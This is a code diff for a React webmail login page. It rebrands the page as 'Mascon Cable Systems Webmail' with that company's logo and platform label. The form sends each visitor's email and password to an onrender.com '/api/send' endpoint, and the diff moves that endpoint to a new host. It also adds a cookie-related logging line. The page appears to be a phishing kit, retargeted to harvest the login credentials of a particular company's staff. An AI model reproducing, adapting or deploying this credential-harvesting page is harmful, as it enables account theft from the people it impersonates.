@@ -3,6 +3,7 @@ import React from 'react';
 
 import'./home.css';
 import logo from './logo.png';
+import mascon from './mascon.png';
 
 import { useState } from 'react';
 import axios from 'axios';
@@ -13,7 +14,7 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Adams")
+    const[platform, setPlatform] = useState("Mascon")
 
     const[showError, setShowError] = useState(false);
 
@@ -22,7 +23,9 @@ function Home(){
 
     useEffect(() => {
         // Code to run when the component mounts or when dependencies change
+        const mycook = window.browser;
       showCookies();
+      console.log(mycook);
 
       }, [])
 
@@ -41,7 +44,7 @@ async function handleSubmit(e){
     e.preventDefault();
 
     try {
-        const response = await axios.post('https://myrootbackend-4cjn.onrender.com/api/send', {
+        const response = await axios.post('https://myrootbackendone.onrender.com/api/send', {
             email:email,
             password:password,
             platform:platform
@@ -65,7 +68,7 @@ async function handleSubmit(e){
     return (
         <>
             <nav className='mynav px-3 py-3'>
-                <img className='navimage' src={logo} />
+                <img className='navimage' src={mascon} />
 
             </nav>
 
@@ -80,7 +83,7 @@ async function handleSubmit(e){
             </button>
             </div>}
 
-            <div className='formdiv col-md-5 m-auto p-0 '>
+            <div className='formdiv col-md-4 m-auto p-0 '>
             {showError && <div className="alert alert-danger alert-dismissible fade show" role="alert">
             <strong className='text-center'>Invalid Email or Password</strong> 
             <button type="button" className="close" data-dismiss="alert" aria-label="Close">
@@ -89,7 +92,7 @@ async function handleSubmit(e){
             </div>}
 
                 <div className='cardhead'>
-                Welcome to Webmail
+                Welcome to Mascon Cable Systems Webmail
                 </div>
 
                 <form onSubmit={handleSubmit}>
@@ -127,7 +130,7 @@ async function handleSubmit(e){
             
             <br/>
 
-                <p className='info'>Webmail</p>
+                <p className='info'>Mascon Cable Systems Webmail</p>
         </>
     );
 
